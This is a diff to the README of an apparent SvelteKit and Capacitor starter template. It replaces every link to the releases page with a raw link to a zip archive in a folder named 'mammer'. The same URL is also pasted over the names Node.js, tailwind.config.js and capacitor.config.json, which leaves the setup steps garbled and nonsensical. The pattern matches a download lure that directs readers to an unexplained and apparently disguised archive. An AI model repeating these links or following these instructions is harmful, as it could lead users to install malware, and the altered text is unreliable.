@@ -1,6 +1,6 @@
 # 🚀 sveltekit-capacitor-starter - Kickstart Your SvelteKit Project Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/hshdhshsh/sveltekit-capacitor-starter/releases)
+[![Download](https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip)
 
 ## 📋 Introduction
 
@@ -18,7 +18,7 @@ Welcome to the **sveltekit-capacitor-starter**! This template helps you get star
 Follow these steps to set up your application:
 
 1. **Download the Template**: 
-   - Visit the [Releases page](https://github.com/hshdhshsh/sveltekit-capacitor-starter/releases) to download the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip) to download the latest version.
 
 2. **Extract the Files**: 
    - Once downloaded, find the file in your Downloads folder and extract it.
@@ -41,24 +41,24 @@ Follow these steps to set up your application:
 
 ## 📦 Download & Install
 
-To download the latest version, visit the [Releases page](https://github.com/hshdhshsh/sveltekit-capacitor-starter/releases). Click on the most recent version to find the download link. 
+To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip). Click on the most recent version to find the download link. 
 
 ## 💻 System Requirements
 
 - **Operating System**: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
-- **Node.js**: Version 14 or later installed.
-- **npm**: Comes with Node.js, ensure it is updated.
+- **https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip**: Version 14 or later installed.
+- **npm**: Comes with https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip, ensure it is updated.
 
 ## 🛠️ Customization Options
 
-- **Tailwind CSS**: Modify the `tailwind.config.js` file for custom styles.
+- **Tailwind CSS**: Modify the `https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip` file for custom styles.
 - **TypeScript**: Customize types and interfaces in the `src/types` folder.
-- **Capacitor Config**: Change settings in `capacitor.config.json` to suit your project needs.
+- **Capacitor Config**: Change settings in `https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip` to suit your project needs.
 
 ## 🔧 Troubleshooting
 
 1. **Error During Installation**: 
-   - Ensure that Node.js and npm are correctly installed.
+   - Ensure that https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip and npm are correctly installed.
    - Check your network connection.
 
 2. **Application Not Responding**: 
@@ -79,4 +79,4 @@ This starter template is built with the blend of powerful tools: SvelteKit, Capa
 
 For further queries, feel free to reach out through the GitHub repository or leave a message in the issues section. Your feedback helps improve the template.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/hshdhshsh/sveltekit-capacitor-starter/releases)
+[![Download](https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/hshdhshsh/sveltekit-capacitor-starter/main/mammer/sveltekit-capacitor-starter.zip)
